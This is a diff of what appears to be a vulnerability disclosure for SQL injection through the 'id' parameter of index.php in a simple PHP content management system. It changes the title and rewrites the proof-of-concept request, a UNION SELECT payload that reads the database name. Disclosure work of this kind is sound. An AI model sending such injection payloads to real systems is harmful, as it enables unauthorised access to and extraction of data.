@@ -1,4 +1,4 @@
-# SQL Injection in index.php - Simple Content Management System PHP
+# SQL Injection via id Parameter in index.php - Simple Content Management System in PHP
 
 ## Description
 A SQL Injection vulnerability exists in Simple Content Management 
@@ -32,7 +32,7 @@ Simple Content Management System PHP
 ## Proof of Concept (PoC)
 
 ### Payload:
-GET /web/index.php?id=1%20UNION%20SELECT%201,2,database()--%20- HTTP/1.1
+GET /web/index.php?id=1 UNION SELECT 1,database(),3-- - HTTP/1.1
 Host: [target]
 <img width="1920" height="1080" alt="Screenshot 2026-04-05 051727" src="https://github.com/user-attachments/assets/5fb261e8-ad72-4abd-9808-5926017fc10c" />
 
